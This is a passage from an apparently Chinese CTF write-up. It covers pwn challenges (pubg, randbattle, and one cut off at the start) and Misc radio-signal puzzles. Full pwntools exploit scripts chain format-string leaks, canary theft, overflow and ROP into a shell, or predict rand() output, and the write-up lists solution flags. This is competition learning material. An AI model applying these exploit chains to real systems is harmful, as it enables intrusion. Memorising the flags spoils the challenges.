        sl(str(idx))
        ru('Where you want to edit/input?')
        sl(str(id))
        ru('please input content')
        se(content)
        ru('input your title')
        se(title)
        ru('input your description&#92;n&gt;')
        se(desc)
        ru('&gt;')
    def export(idx,id1,id2):
        sl(str(idx))
        ru('Which book you want to export')
        sl(str(id1))
        ru('where you want to output')
        sl(str(id2))
        ru('&gt;')
    def mexit():
        sl('q')
        ru('Are you sure you want to exit?(y/n)')
        sl('n')
        ru('&gt;')
    sl('6')
    ru('what do you want to proofread?')
    sl('1')
    ru('which one you want to proofread?')
    sl('1')
    ru('how many words you assume are same?')
    sl('400')
    ru('&#92;x00'*0x108)
    data=ru('&#92;n')[:-1]
    pbase=u64(data[:8])-0x138F
    libc=u64(data[-8:])
    if debug:
        base=libc-0x20830
    else:
        base=libc-0x21F45
    ru('&gt;')
    inn(3,1,'a'*0xff,'b'*0x1f,'c'*0x80+p32(0)+p32(0x300)+cyclic(0x77))
    inn(2,2,cyclic(1),'q'*0x1f,cyclic(1))
    payload='a'*120+p64(pbase+0x203000+0x100)+cyclic(8)+p64(pbase+0x203000+0x100)+'a'*8+p64(base+0x4647c)
    inn(3,3,cyclic(0xff),'b'*0x1f,payload)
    export(4,1,1)
    export(4,3,2)
    sl('7')
    ru('what do you want to delete?')
    sl('1')
    ru('which one you want to delete?')
    sl('2')
    print(hex(pbase))
    print(hex(libc))
    p.interactive()
# Misc
## Mysterious signals
hint:无线射频频谱 radio frequency spectrum
使用cool edit pro2打开文件,在"查看"一栏选择"光谱显示窗"即可看到flag  
> flag:flag{756e69636f726e}
## 核弹遥控器密码
hint:芯片型号pt2242,24位有效数据 pt2242 chipset, 24 bits of valid data
pt2242是固定码芯片
通过inspectrum()这个工具来分析信号
结合 教程，可以调出：
其中，高电平长的为1，低电平长的为0
00000001011110100101100  
转16进制为flag，17A59  
吐槽一下，一开始出题人没说flag是16进制大写，害得我们试了好久，还以为方法错了
> flag:17A59
## 诡异的校验
捕获到一份受干扰的信号文件，万幸的是被干扰的部分只是数据校验部位，必须要根据仅剩的信号还原出全部数据（十六进制）
hint1: 20959185b1115208(射频文件解码后的数据)  
 20959185b1115208(data of decoded
spectrum file)  
hint2:We have updated the challenge information, add English description as
below: We captured a disturbed signal file, fortunately, only the checksum has
been disturbed, you should recover all the data according to the remaining
signals(hex).
在github上搜索FXTH871x7，找到这个：
猜测校验位置是crc
计算出crc16
拼接到数据后面得到flag
> flag:20959185b1115208133f
# AWD
## pubg
漏洞其实挺明显的，首先gou那个函数 有一个格式化字符串漏洞，可以leak一些地址，利用%x%x%x%lx能leak到一个ld.so附近的地址
在gou函数那里，它还会让你猜3个byte的随机数，如果强行爆破的话是不行的，因为概率是1/(256 _256_ 256)
但是格式化字符串漏洞%x%x，第二个leak出来的东西是猜中的数量，所以利用这个就可以爆破出来，爆破最多256*3次就行了
爆破完之后到gang那个函数有一个任意读，利用上面leak的ld.so附近的地址，可以leak出canary，因为canary会在那附近存一下
任意读完之后，有一个栈溢出，利用栈溢出就可以进行rop来get shell
这里还有一个坑点就是，本地ld.so和libc.so的偏移和服务器的不同，后面强行爆破了一波
    from pwn import *
    import re
    debug=1
    #context.log_level='debug'
    e=ELF('./libc-2.23.so')
    if debug:
        p=process('./pubg')
    else:
        p=remote('192.168.20.11',20001)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def sl(x):
        p.sendline(x)
    def choose(x,s):
        ru('&gt; ')
        sl(str(x))
        ru('which one is your favorite?')
        sl(str(s))
        ru('&gt; ')
    def gou(x,con=False):
        sl('2')
        ru('Maybe you can get an airdrop. Tell me your position:&#92;n')
        sl(x)
        if not con:
            data=ru(' has')[:-4]
            ru('&gt; ')
            return data
        else:
            ru('&gt; ')
    def gang(x):
        sl('1')
        ru('Winner winner,chicken dinner. The whole memory is yours, now pick one chicken:')
        sl(str(x))
        ru('The ')
        cookie=ru(' ch')[:-3]
        cookie=cookie[:15]
        payload=cyclic(40)+'&#92;x00'+cookie+p64(base+0x4526a)+'&#92;x00'*0x100
        sl(payload)    
    def brute():
        secert=''
        for i in range(3):
            for q in range(1,256):
                if chr(q)=='$' or chr(q)=='*' or chr(q)=='n':
                    continue
                if gou(secert+chr(q)+'%x%x')[i+3]==str(i+1):
                    secert+=chr(q)
                    break
        return secert
    choose(1,1)
    libc=int(gou('%x%x%x%lx')[5:],16)
    tbase=libc-0x5D3700
    if debug:
        base=tbase
    else:
        base=libc-0x5D3700-0x4000-0x16000
    secert=brute()+'&#92;00'
    context.log_level='debug'
    gou(secert,True)
    gang(tbase+0x5D3728+1)
    ru('icken is on your plate, enjoy it~')
    p.sendline('cat flag')
    flag=ru('&#92;n')
    p.interactive()
## randbattle
这题相对简单点，所以就做了这题，不过这题出得有点恶心，能搅屎..........
首先题目有3个选项
  1. Double Dice Game
  2. Triple Dice Game
  3. Combination Game
首先先来说下第一个功能
**Double Dice Game**
它会rand三个数，然后让你去猜，假如说你没进第三个功能，那么一开始就是srand(0)的，因此这三个数是固定的
如果三个数都成功猜中，它会让你输入5byte，但实际是4byte的密码，然后读取flag，用输入的密码加密，加密的方法是tea加密
加密完之后，它会判断是否存在一个 /tmp/qualiii 这个文件，如果存在的话就会返回上一层
不存在的话，它会创建并将flag写入到其中，然后sleep，sleep完之后，如果文件还存在的话，就会打印加密后的flag
**Triple Dice Game**
这里分为3个部分
第一个函数会首先srand(time(0)) 然后再rand了三个字母，第二个函数打印这三个字母，然后第三个函数是读取的，读取然后之后判断输入是否正确
如果正确的话，会进到最后一个函数
这里还是让你猜3个数，猜中之后
能删除 /tmp/qualiii这个文件
**Combination Game**
前面是猜字母加猜数字
猜中之后，能打印出/tmp/qualiii的内容
下面是一个简单的payload，没人竞争的时候能读出flag，至于怎么心机的利用这几个功能去搅屎和反搅屎，这里就不多说了.......（策略太多了
    from pwn import *
    import ctypes
    LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.23.so')
    debug=1
    context.log_level='debug'
    if debug:
        p=process('./randbattle')
        #p=process('',env={'LD_PRELOAD':'./libc.so'})
        gdb.attach(p)
    else:
        p=remote('192.168.20.13',20003)
    def ru(x):
        return p.recvuntil(x)
    def se(x):
        p.send(x)
    def sl(x):
        p.sendline(x)
    import sys
    from ctypes import *
    def decipher(v, k):
        y = c_uint32(v[0])
        z = c_uint32(v[1])
        sum = c_uint32(0xc6ef3720)
        delta = 0x9e3779b9
        n = 32
        w = [0,0]
        while(n&gt;0):
            z.value -= ( y.value &lt;&lt; 4 ) + k[2] ^ y.value + sum.value ^ ( y.value &gt;&gt; 5 ) + k[3]
            y.value -= ( z.value &lt;&lt; 4 ) + k[0] ^ z.value + sum.value ^ ( z.value &gt;&gt; 5 ) + k[1]
            sum.value -= delta
            n -= 1
        w[0] = y.value
        w[1] = z.value
        return w
    def tdice():
        sl('2')
        ru('case2')
        if debug:
            LIBC.srand(LIBC.time(0))
        else:
            LIBC.srand(LIBC.time(0)-20)    
        s=[LIBC.rand()%26+65 for _ in range(3)]
        w=''
        for i in s:
            w+=chr(i)
        w+='&#92;x00'
        se(w)
        ru('num:')
        sl(str(LIBC.rand()%3))
        ru('num:')
        sl(str(LIBC.rand()%3))
        ru('num:')
        sl(str(LIBC.rand()%3))
        ru('Your choice:')
    def ddice():
        sl('1')
        ru('num:')
        sl(str(LIBC.rand()%6))
        ru('num:')
        sl(str(LIBC.rand()%6))
        ru('Set your pass:')
        se('&#92;x00'*5)
        ru('Here is your gift:&#92;n')
        flag=ru('C U')[:-3]
        flag=flag.split(':')
        flag=[chr(int(i,16)) for i in flag]
        w=''
        for i in flag:
            w+=i
        t=[]
        key=[0,0,0,0]
        flag=''
        for i in range(0,len(w),4):
            t.append(u32(w[i:i+4]))
        for i in range(0,len(t),2):
            q=decipher(t[i:i+2],key)
            flag+=p32(q[0])
            flag+=p32(q[1])
        return flag
    tdice()
    print(ddice())
    p.interactive()